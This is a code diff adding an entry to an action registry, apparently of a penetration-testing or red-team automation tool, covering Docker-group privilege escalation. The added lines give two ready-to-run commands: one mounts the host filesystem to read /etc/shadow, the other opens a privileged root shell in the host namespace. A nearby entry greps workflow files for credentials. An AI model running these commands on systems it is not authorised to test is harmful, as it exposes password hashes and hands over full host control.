@@ -703,6 +703,12 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="Audit dependency files for supply chain attack indicators."),
 
     # --- Supply chain: GitLab CI/CD (self-learned from Shadow Supply chain 4) ---
+    "docker_group_privesc": _a("docker_group_privesc",
+        ["docker run --rm -v /:/host alpine:latest sh -c 'cat /host/etc/shadow'",
+         "docker run --rm -it --privileged --pid=host -v /:/host alpine:latest chroot /host sh"],
+        risk="propose", runnable=False,
+        note="docker group = host root. First line reads any file as root; second drops a full "
+             "interactive root shell in the host namespace. Use any local image (alpine/python)."),
     "inspect_workflow_config": _a("inspect_workflow_config",
         ["grep -aoE \"git .*(credential\\.helper|pull).*|import_module\\([^)]*\\)|password=[^ '\\\"]+\" "
          "<workflow.json|script>"],
